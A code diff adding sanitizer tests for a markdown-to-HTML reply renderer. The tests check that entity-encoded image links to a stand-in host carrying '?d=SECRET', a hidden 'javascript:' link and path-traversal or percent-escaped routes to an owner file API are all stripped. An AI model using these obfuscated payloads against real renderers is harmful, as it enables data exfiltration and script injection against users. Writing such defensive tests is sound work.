@@ -231,6 +231,34 @@ describe('links and pictures in a reply (W7f)', () => {
     expect(block).not.toContain('<div>');
   });
 
+  it('an entity cannot hide another origin or scheme from the markdown pass', () => {
+    const html = richMarkdownToHtml(
+      [
+        '![i](&#104;ttps://evil.example.test/p.png?d=SECRET)',
+        '',
+        '![j](&#47;&#47;evil.example.test/x.png)',
+        '',
+        '[a](&#106;avascript:alert(1))',
+      ].join('\n'),
+      { adminUser: false },
+    );
+    expect(html).not.toContain('<img');
+    expect(html).not.toContain('<a ');
+    expect(html).not.toContain('href=');
+    expect(html).not.toContain('evil.example.test');
+    // The link's scheme is refused for an Admin user too.
+    const admin = richMarkdownToHtml('[a](&#106;avascript:alert(1))', { adminUser: true });
+    expect(admin).not.toContain('<a ');
+    expect(admin).not.toContain('href=');
+  });
+
+  it('a dot segment or an escape cannot reach an owner byte route', () => {
+    const html = richMarkdownToHtml('![x](/a/../api/files/x) ![y](/api/%66iles/x)', {
+      adminUser: false,
+    });
+    expect(html).not.toContain('<img');
+  });
+
   it('an alt that looks like markup stays text', () => {
     const html = richMarkdownToHtml('![<b>x</b>](https://x/y.png)', { adminUser: false });
     expect(html).not.toContain('<b>');
